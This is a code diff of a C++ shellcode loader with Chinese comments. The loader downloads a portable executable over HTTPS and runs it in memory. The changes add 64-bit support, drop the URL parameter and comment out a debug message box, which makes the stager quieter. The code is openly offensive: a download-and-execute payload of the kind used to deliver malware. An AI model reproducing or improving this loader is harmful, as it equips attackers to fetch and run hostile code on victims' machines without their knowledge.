@@ -1,10 +1,15 @@
 #include "ShellCode.h"
 
 //加载起始函数，跳转到入口函数
+#ifdef _WIN64
+VOID  mmLoaderSCStart(){
+	Strat();
+#else
 VOID _declspec(naked) mmLoaderSCStart()
 {
-	
+
 	__asm	jmp Strat;
+#endif
 }
 
 
@@ -49,7 +54,7 @@ public:
 	
 
 	//提取项目的main文件，StartSCode相当于项目的main函数
-	void __stdcall StartSCode(char * URL)
+	void __stdcall StartSCode()
 	{
 		
 		
@@ -62,7 +67,7 @@ public:
 
 		int size = HttpDownload(host, path, 443, TRUE);
 
-		fn.fnMessageBoxA(NULL, newbuff, NULL, MB_OK);
+		//fn.fnMessageBoxA(NULL, newbuff, NULL, MB_OK);
 	
 		RunPortableExecutable();
 
@@ -75,15 +80,21 @@ public:
 };
 
 //sehllcode入口函数
-void __stdcall Strat(char * URL)
+void __stdcall Strat()
 {
 	//由于需要模拟全局变量，所以使用类包裹下
 	RmExecute runclass;
 	
-	runclass.StartSCode(URL);
+	runclass.StartSCode();
 }
-
+#ifdef _WIN64
+void  mmLoaderSCEnd()
+{
+	
+#else
 void __declspec(naked) mmLoaderSCEnd()
 {
+
 	__asm int 3;
+#endif
 }
